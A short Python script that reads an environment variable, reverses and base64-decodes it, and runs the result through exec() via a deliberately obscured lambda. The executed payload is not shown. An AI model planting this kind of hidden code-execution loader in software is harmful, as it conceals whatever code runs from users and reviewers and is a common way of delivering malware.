from dotenv import load_dotenv
import os

load_dotenv()

secret = os.getenv('secret')

_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(f'{secret}'))
